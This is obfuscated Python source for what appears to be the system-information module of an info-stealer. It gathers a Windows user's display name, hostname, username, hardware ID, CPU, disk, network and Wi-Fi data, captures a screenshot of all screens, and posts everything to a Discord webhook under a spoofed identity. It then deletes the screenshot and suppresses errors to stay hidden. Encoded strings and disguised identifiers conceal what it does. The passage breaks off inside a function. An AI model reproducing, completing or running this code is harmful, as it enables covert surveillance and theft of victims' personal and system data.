import ctypes
import os
import re
import subprocess
import uuid
import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time

class SystemInfo:

    def __init__(self, webhook):
        𝙬𝗲𝗯𝗵𝗼𝗼𝗸 = 𝙎𝘆𝘯𝙘𝘞𝘦𝗯𝙝𝗼𝘰𝗸.from_url(𝘄𝗲𝘣𝗵𝘰𝙤𝙠)
        𝘦𝙢𝗯𝘦𝙙 = 𝘌𝙢𝗯𝗲𝘥(title=__𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b5\xce\xa9Jq\x0f+\xf1t\xcd)\x8d\xca\xb5\xacL\nw3H\x0c\xb7,\x05\x00j\x0f\x08a')).decode(), color=𝙞𝘯𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 332 - (𝗶𝙣𝘁(𝘖) + 𝘪), 𝗺𝗮𝘱(__𝗶𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝙞𝘵𝘦𝗿(__𝘪𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝗻𝙜𝘦(0)), __𝗶𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝘦𝗺𝙗𝘦𝘥.add_field(name=𝘴𝗲𝘭𝘧.user_data()[𝘪𝗻𝙩.from_bytes(𝘮𝗮𝗽(lambda O, i: 954 - (𝗶𝘯𝘵(𝗢) + 𝘪), 𝙢𝘢𝙥(__𝙞𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘵𝗲𝗿(__𝘪𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝗻𝗴𝘦(0)), __𝗶𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝙚𝙡𝘧.user_data()[𝘪𝘯𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 455 - (𝘪𝘯𝘁(𝙊) + 𝗶), 𝗺𝗮𝙥(__𝗶𝘮𝙥𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝘁𝘦𝙧(__𝙞𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3s\t5\x00\x00\x02\xe2\x01\x18')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝘦(1)), __𝙞𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝘦𝙡𝗳.user_data()[𝘪𝙣𝘵.from_bytes(𝘮𝗮𝘱(lambda O, i: 603 - (𝗶𝘯𝘁(𝙊) + 𝘪), 𝙢𝘢𝘱(__𝗶𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝗶𝘁𝙚𝘳(__𝘪𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcbr\xac\x00\x00\x03t\x01r')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(1)), __𝗶𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘦𝘮𝗯𝘦𝗱.add_field(name=𝘀𝗲𝗹𝗳.system_data()[𝙞𝘯𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 616 - (𝘪𝙣𝙩(𝗢) + 𝗶), 𝙢𝗮𝙥(__𝗶𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝘁𝙚𝘳(__𝗶𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝘦(0)), __𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝘦𝗹𝘧.system_data()[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 742 - (𝗶𝗻𝙩(𝙊) + 𝘪), 𝙢𝗮𝘱(__𝗶𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘁𝘦𝗿(__𝙞𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\n\xac\x00\x00\x03\xc4\x01\x92')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝗲(1)), __𝙞𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝘦𝘭𝗳.system_data()[𝘪𝘯𝘁.from_bytes(𝙢𝙖𝗽(lambda O, i: 986 - (𝙞𝗻𝘵(𝙊) + 𝗶), 𝗺𝗮𝙥(__𝘪𝗺𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝙩𝘦𝙧(__𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0fI7\x00\x00\x03:\x01;')).decode())] * 3)), 𝗿𝘢𝗻𝘨𝗲(1)), __𝘪𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝙚𝙢𝙗𝘦𝘥.add_field(name=𝙨𝗲𝘭𝙛.disk_data()[𝗶𝗻𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 776 - (𝗶𝘯𝘵(𝗢) + 𝘪), 𝗺𝗮𝙥(__𝘪𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝘁𝘦𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝘦(0)), __𝗶𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝗲𝘭𝙛.disk_data()[𝗶𝗻𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 739 - (𝗶𝙣𝘵(𝗢) + 𝙞), 𝘮𝘢𝘱(__𝗶𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝘪𝙩𝗲𝘳(__𝗶𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xab\xf25\x01\x00\x03x\x01J')).decode())] * 3)), 𝗿𝘢𝗻𝗴𝘦(1)), __𝗶𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝘦𝙡𝘧.disk_data()[𝗶𝙣𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 304 - (𝗶𝘯𝘵(𝗢) + 𝙞), 𝗺𝘢𝗽(__𝘪𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝙩𝘦𝗿(__𝘪𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xadr\xac\x04\x00\x03\xa1\x01\x82')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝘦(1)), __𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘦𝗺𝘣𝗲𝘥.add_field(name=𝘴𝙚𝘭𝗳.network_data()[𝘪𝘯𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 860 - (𝗶𝘯𝙩(𝘖) + 𝗶), 𝙢𝗮𝗽(__𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝙩𝗲𝘳(__𝗶𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝙚(0)), __𝙞𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝘦𝘭𝘧.network_data()[𝙞𝗻𝙩.from_bytes(𝙢𝙖𝙥(lambda O, i: 284 - (𝘪𝙣𝘵(𝙊) + 𝗶), 𝘮𝗮𝙥(__𝙞𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝗶𝘵𝗲𝗿(__𝙞𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcdJ\xaf\x02\x00\x03\xbe\x01\x99')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝙚(1)), __𝘪𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝗲𝘭𝘧.network_data()[𝘪𝗻𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 831 - (𝗶𝘯𝙩(𝗢) + 𝙞), 𝘮𝗮𝗽(__𝗶𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝘁𝘦𝙧(__𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3w\xf14\x05\x00\x02\xd3\x01\x12')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝘦(1)), __𝙞𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘦𝗺𝗯𝘦𝘥.add_field(name=𝙨𝙚𝗹𝗳.wifi_data()[𝗶𝘯𝘁.from_bytes(𝙢𝙖𝙥(lambda O, i: 308 - (𝗶𝗻𝘵(𝗢) + 𝘪), 𝙢𝗮𝙥(__𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝗶𝙩𝘦𝙧(__𝙞𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝙣𝗴𝗲(0)), __𝗶𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝙚𝘭𝘧.wifi_data()[𝘪𝗻𝘵.from_bytes(𝙢𝘢𝙥(lambda O, i: 599 - (𝗶𝘯𝙩(𝙊) + 𝙞), 𝗺𝗮𝘱(__𝙞𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝘁𝘦𝙧(__𝘪𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0b\xc96\x01\x00\x03B\x01B')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝙚(1)), __𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝙚𝘭𝘧.wifi_data()[𝘪𝘯𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 337 - (𝗶𝙣𝘁(𝗢) + 𝙞), 𝙢𝙖𝙥(__𝗶𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝘵𝙚𝗿(__𝗶𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\xf25\x04\x00\x03q\x01F')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝙚(1)), __𝙞𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝙞𝘮𝙖𝗴𝘦 = 𝗜𝘮𝘢𝗴𝗲𝙂𝙧𝙖𝗯.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
        𝘪𝗺𝙖𝙜𝘦.save(__𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())
        𝗲𝗺𝘣𝗲𝗱.set_image(url=__𝘪𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8b\x8c\x082\x88\x0c\xf7\xcbO\n\x0f+Mq\xc9/\xf31\xf6\xcbJ\xce\r\xcbI\xca\x03\x8a\x19\x07\x96&\xbb\x9b\xe6\x01\x00\xe9\n\x0c\xb0')).decode())
        try:
            𝘸𝙚𝙗𝗵𝙤𝙤𝙠.send(embed=𝙚𝙢𝗯𝙚𝙙, file=𝙁𝙞𝙡𝗲(__𝘪𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xc9\xa9\xa8\x8a4\xf6\xca\x89\n7\xadJt\xb74\xf0\xc9s*\x8d*\xb7\xb5\x05\x00hj\x08\x1a')).decode(), filename=__𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()), username=__𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x0b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a0\x03\xe6')).decode(), avatar_url=__𝘪𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4,\xf0\xc9\xcd)\x892\x0e\xab\xf4\xc9\xf5+K\n\xb6\xf4L\xcc+\xc8M\xcc\x8d\n\xf6\xc9s*\x8d*\xb7\xb5\x05\x00Q\xda\x0fT')).decode())
        except:
            pass
        if 𝗼𝘀.path.exists(__𝙞𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()):
            𝘰𝘴.remove(__𝙞𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())

    def user_data(self):

        def display_name():
            𝘎𝙚𝙩𝘜𝘀𝗲𝗿𝗡𝙖𝘮𝗲𝗘𝘅 = 𝗰𝙩𝘆𝗽𝗲𝘀.windll.secur32.GetUserNameExW
            𝘕𝗮𝘮𝙚𝗗𝘪𝘀𝗽𝗹𝗮𝙮 = 𝗶𝘯𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 362 - (𝘪𝙣𝘁(𝘖) + 𝙞), 𝙢𝘢𝙥(__𝘪𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝘵𝘦𝙧(__𝘪𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xad\n5\x05\x00\x03\x85\x01R')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝘦(1)), __𝗶𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)
            𝙨𝗶𝘻𝘦 = 𝗰𝙩𝘺𝙥𝘦𝘴.pointer(𝙘𝙩𝙮𝗽𝗲𝘴.c_ulong(𝘪𝘯𝘵.from_bytes(𝘮𝗮𝗽(lambda O, i: 614 - (𝙞𝘯𝘁(𝙊) + 𝙞), 𝙢𝙖𝙥(__𝗶𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝗶𝘵𝗲𝘳(__𝘪𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝗻𝗴𝘦(0)), __𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)))
            𝙂𝙚𝘵𝙐𝙨𝘦𝗿𝙉𝘢𝘮𝘦𝗘𝙭(𝗡𝘢𝘮𝘦𝘋𝙞𝙨𝘱𝗹𝙖𝘺, None, 𝙨𝘪𝘇𝙚)
            𝙣𝗮𝗺𝗲𝗕𝘶𝙛𝙛𝘦𝙧 = 𝙘𝘁𝘺𝗽𝙚𝙨.create_unicode_buffer(𝙨𝗶𝙯𝙚.contents.value)
            𝙂𝙚𝘵𝗨𝘀𝗲𝙧𝗡𝗮𝘮𝙚𝙀𝘹(𝗡𝘢𝙢𝘦𝘋𝘪𝘴𝘱𝙡𝗮𝙮, 𝙣𝗮𝗺𝙚𝘉𝘂𝗳𝘧𝙚𝙧, 𝘴𝘪𝘇𝘦)
            return 𝗻𝘢𝘮𝗲𝗕𝘶𝙛𝙛𝙚𝘳.value
        𝙙𝙞𝙨𝘱𝗹𝙖𝙮_𝗻𝗮𝘮𝘦 = 𝘥𝙞𝙨𝗽𝙡𝘢𝘆_𝙣𝘢𝘮𝗲()
        𝙝𝙤𝘀𝘵𝙣𝘢𝘮𝗲 = 𝙤𝙨.getenv(__𝘪𝙢𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b"x\xda\x0b4\xb0\xf4\x0bu\x0b\x0b\r\n\xf3\xf2\x0f\x0c5t\x03\x00'w\x04\xad")).decode())
        𝘂𝙨𝙚𝘳𝙣𝙖𝙢𝗲 = 𝗼𝘀.getenv(__𝙞𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x0b\x0b\xf3s\x0b\xcd6u\n\t\r\xb5\x05\x00\x18\x9b\x03\xb3')).decode())
        return (__𝙞𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcf\xf52L6\x0eJK\x0c7MK6\xca)Nt\xb74\x8c\x8a\x082\x88\n\xc9O\x0f\x8b\xf0\xcbIN\xb7\xb5\x05\x00\xd7\xba\x0b\xc3')).decode(), __𝗶𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0fr\xcf\xa9Jv\xaf\xc8H\rv\xf2\x8f\x0c7\xcc\xf1\xcft2O\x0b,\xf0L2\xf63H\xcau+\x89\n\xc9OO56\xf0\x0e\x8b\xf0\xcbI\xce5\xcdH\n\x0f5\xf3\xf4(\xb1\x8c\x04\xea\x05\x00\xbfK\x15]')).decode().format(𝗱𝘪𝘴𝗽𝘭𝘢𝘺_𝗻𝘢𝙢𝙚, 𝘩𝘰𝙨𝘵𝘯𝘢𝙢𝘦, 𝙪𝙨𝘦𝗿𝗻𝙖𝙢𝘦), False)

    def system_data(self):

        def get_hwid():
            try:
                𝙝𝘄𝗶𝗱 = 𝘴𝙪𝗯𝘱𝗿𝘰𝗰𝗲𝘀𝘀.check_output(__𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xac*H\x0e3\xca)\x8dr\xb74N6\xac\x08I\x8d\xf03\x88\n7\xa8\xf2\xcd\xa90\x8e\xcc\r+\x89pK\xf1\x0b\x0e\xf5-\x8d\x8a\xc8\xc8\xf1t\xf7\xabJ\xf6\xf0*\x8b\xf2\x08\xcbJqv\xca\x8b\x8a\x08LO\x89\x08+\x88r\xb4\xb5\x05\x00\x89\xca\x18\xbc')).decode(), shell=True, stdin=𝙨𝘶𝙗𝙥𝙧𝘰𝘤𝙚𝘀𝘀.PIPE, stderr=𝘀𝘶𝗯𝘱𝗿𝗼𝗰𝙚𝙨𝘴.PIPE).decode(__𝘪𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝘪𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())[𝗶𝙣𝘵.from_bytes(𝘮𝙖𝗽(lambda O, i: 781 - (𝗶𝘯𝙩(𝙊) + 𝗶), 𝗺𝙖𝗽(__𝗶𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝗶𝘁𝘦𝘳(__𝗶𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xabJ/\x07\x00\x03\xef\x01\xa7')).decode())] * 3)), 𝙧𝗮𝙣𝗴𝙚(1)), __𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].strip()
            except:
                𝙝𝘸𝗶𝗱 = __𝙞𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xc9\xb5,\x8d\n\xb4\xb5\x05\x00\x0cT\x02\x95')).decode()
            return 𝗵𝘄𝙞𝙙
        𝘤𝗽𝘂 = 𝘄𝙢𝙞.WMI().Win32_Processor()[𝗶𝙣𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 455 - (𝙞𝘯𝘁(𝘖) + 𝙞), 𝘮𝗮𝙥(__𝙞𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝘪𝘵𝗲𝙧(__𝗶𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝗲(0)), __𝙞𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
